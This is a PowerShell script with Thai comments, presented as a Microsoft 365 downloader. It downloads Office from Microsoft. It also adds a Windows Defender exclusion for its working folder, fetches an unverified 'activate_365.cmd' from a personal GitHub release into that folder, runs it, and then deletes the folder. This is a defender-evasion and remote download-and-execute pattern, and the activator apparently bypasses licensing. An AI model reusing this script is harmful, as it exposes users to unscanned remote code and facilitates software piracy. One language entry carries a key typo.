# 1. การเตรียมการ: สร้างโฟลเดอร์และตั้งค่า Exclusion
$p = "C:\phwyverysad"
if (!(Test-Path $p)) { 
    New-Item -Path $p -ItemType Directory | Out-Null 
}
Write-Host "Configuring Windows Defender Exclusion..." -ForegroundColor Cyan
Add-MpPreference -ExclusionPath $p -EA 0

# 2. ตั้งค่า Network และ UI
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$oldP = $ProgressPreference
$ProgressPreference = 'SilentlyContinue'

# รายชื่อภาษาทั้งหมด (ไทยและอังกฤษอยู่บนสุด)
$langs = @(
    @{n="Thai [th-TH]"; c="th-th"},
    @{n="English [en-US]"; c="en-us"},
    @{n="Arabic [ar-SA]"; c="ar-sa"},
    @{n="Bulgarian [bg-BG]"; c="bg-bg"},
    @{n="Chinese (Simplified) [zh-CN]"; c="zh-cn"},
    @{n="Chinese (Taiwan) [zh-TW]"; c="zh-tw"},
    @{n="Croatian [hr-HR]"; c="hr-hr"},
    @{n="Czech [cs-CZ]"; c="cs-cz"},
    @{n="Danish [da-DK]"; c="da-dk"},
    @{n="Dutch [nl-NL]"; c="nl-nl"},
    @{n="Estonian [et-EE]"; c="et-ee"},
    @{n="Finnish [fi-FI]"; c="fi-fi"},
    @{n="French [fr-FR]"; c="fr-fr"},
    @{n="German [de-DE]"; c="de-de"},
    @{n="Greek [el-GR]"; c="el-gr"},
    @{n="Hebrew [he-IL]"; c="he-il"},
    @{n="Hindi [hi-IN]"; c="hi-in"},
    @{n="Hungarian [hu-HU]"; c="hu-hu"},
    @{n="Indonesian [id-ID]"; c="id-id"},
    @{n="Italian [it-IT]"; c="it-it"},
    @{n="Japanese [ja-JP]"; c="ja-jp"},
    @{n="Kazakh [kk-KZ]"; c="kk-kz"},
    @{n="Korean [ko-KR]"; c="ko-kr"},
    @{n="Latvian [lv-LV]"; c="lv-lv"},
    @{n="Lithuanian [lt-LT]"; c="lt-lt"},
    @{n="Malay [ms-MY]"; c="ms-my"},
    @{n="Norwegian [nb-NO]"; c="nb-no"},
    @{n="Polish [pl-PL]"; c="pl-pl"},
    @{n="Portuguese (Brazil) [pt-BR]"; c="pt-br"},
    @{n="Portuguese (Portugal) [pt-PT]"; c="pt-pt"},
    @{n="Romanian [ro-RO]"; c="ro-ro"},
    @{n="Russian [ru-RU]"; c="ru-ru"},
    @{n="Serbian (Latin) [sr-latn-rs]"; c="sr-latn-rs"},
    @{n="Slovak [sk-SK]"; c="sk-sk"},
    @{n="Slovenian [sl-SI]"; c="sl-si"},
    @{n="Spanish [es-ES]"; c="es-es"},
    @{n="Swedish [sv-SE]"; v="sv-se"},
    @{n="Turkish [tr-TR]"; c="tr-tr"},
    @{n="Ukrainian [uk-UA]"; c="uk-ua"},
    @{n="Vietnamese [vi-VN]"; c="vi-vn"}
)

Write-Host "`n=== Microsoft 365 Downloader (C:\phwyverysad) ===" -ForegroundColor Yellow
for ($i=0; $i -lt $langs.Count; $i++) {
    Write-Host "[$i] $($langs[$i].n)"
}

$sel = Read-Host "`nSelect Language Number"
$lang = $langs[$sel]

if ($null -ne $lang) {
    $url = "https://c2rsetup.officeapps.live.com/c2r/download.aspx?ProductreleaseID=O365ProPlusRetail&platform=x64&language=$($lang.c)&version=O16GA"
    $file = "$p\OfficeSetup.exe"

    # 3. ดาวน์โหลดแบบ Synchronous โดยใช้ .NET WebClient
    Write-Host "`nDownloading Microsoft 365 ($($lang.n))..." -ForegroundColor Green
    try {
        (New-Object System.Net.WebClient).DownloadFile($url, $file)
        
        # 4. รันไฟล์ติดตั้งแบบเงียบ
        Write-Host "Starting Installation... Please wait for the setup to complete." -ForegroundColor Yellow
        Start-Process $file -ArgumentList "/configure" -Wait
        
        # 5. ถามการเปิดใช้งาน (Activation)
        $ans = Read-Host "`nInstallation Done. Activate Microsoft 365 now? (y/n)"
        if ($ans -eq 'y') {
            # โค้ด Activator ที่คุณกำหนด
            $u="https://github.com/plathx/-/releases/download/%E0%B8%88%E0%B8%B9%E0%B8%99%E0%B8%84%E0%B8%AD%E0%B8%A1/activate_365.cmd"
            $f="$p\activate_365.cmd"
            try {
                Write-Host "Downloading Activator..."
                (New-Object System.Net.WebClient).DownloadFile($u,$f)
                if(Test-Path $f){
                    Write-Host "Running Activator..." -ForegroundColor Magenta
                    Start-Process $f -Wait
                }
            } catch {
                Write-Host "Error during activation: $_"
            } finally {
                Write-Host "Cleaning up $p..."
                Start-Sleep -Seconds 3
                if(Test-Path $p){ Remove-Item $p -Recurse -Force -EA 0 }
                Write-Host "Done."
            }
        }
    } catch {
        Write-Host "Error: $_" -ForegroundColor Red
    }
} else {
    Write-Host "Invalid selection." -ForegroundColor Red
}

$ProgressPreference = $oldP
Write-Host "`nProcess Finished."
